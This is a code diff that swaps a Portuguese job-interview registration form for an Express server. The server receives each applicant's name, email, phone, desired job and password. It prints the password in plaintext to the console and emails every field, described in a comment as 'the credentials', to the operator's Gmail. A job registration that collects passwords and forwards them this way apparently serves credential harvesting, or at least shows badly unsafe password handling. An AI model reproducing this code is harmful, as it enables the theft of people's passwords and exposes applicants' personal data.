@@ -1,49 +1,51 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cadastro com Senha</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div class="container">
-        <h1>Cadastro para Entrevista</h1>
-        <form id="entrevistaForm">
-            <div class="form-group">
-                <label for="nome">Nome Completo:</label>
-                <input type="text" id="nome" name="nome" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="telefone">Telefone:</label>
-                <input type="tel" id="telefone" name="telefone" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="cargo">Cargo Desejado:</label>
-                <input type="text" id="cargo" name="cargo" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="senha">Senha:</label>
-                <input type="password" id="senha" name="senha" required>
-            </div>
-            
-            <div class="form-group">
-                <label for="confirmaSenha">Confirmar Senha:</label>
-                <input type="password" id="confirmaSenha" name="confirmaSenha" required>
-            </div>
-            
-            <button type="submit">Enviar Cadastro</button>
-        </form>
-        <div id="mensagem"></div>
-    </div>
-    <script src="script.js"></script>
-</body>
-</html>
+const express = require('express');
+const nodemailer = require('nodemailer');
+const app = express();
+const port = 3000;
+
+app.use(express.json());
+app.use(express.static('public'));
+
+// Configuração do Nodemailer (exemplo com Gmail)
+const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth: {
+        user: 'seu-email@gmail.com', // Substitua pelo seu email
+        pass: 'sua-senha-de-app'     // Use uma senha de aplicativo do Gmail
+    }
+});
+
+app.post('/cadastro', (req, res) => {
+    const { nome, email, telefone, cargo, senha } = req.body;
+    
+    // Exibir no terminal (funciona localmente)
+    console.log('Novo Cadastro Recebido:');
+    console.log('Nome:', nome);
+    console.log('Email:', email);
+    console.log('Telefone:', telefone);
+    console.log('Cargo:', cargo);
+    console.log('Senha:', senha);
+    console.log('------------------------');
+
+    // Enviar email com as credenciais
+    const mailOptions = {
+        from: 'seu-email@gmail.com',
+        to: 'seu-email@gmail.com', // Seu email para receber os dados
+        subject: 'Novo Cadastro Recebido',
+        text: `Nome: ${nome}\nEmail: ${email}\nTelefone: ${telefone}\nCargo: ${cargo}\nSenha: ${senha}`
+    };
+
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            console.error('Erro ao enviar email:', error);
+        } else {
+            console.log('Email enviado:', info.response);
+        }
+    });
+
+    res.status(200).send('Cadastro recebido com sucesso');
+});
+
+app.listen(port, '0.0.0.0', () => {
+    console.log(`Servidor rodando em http://0.0.0.0:${port}`);
+});
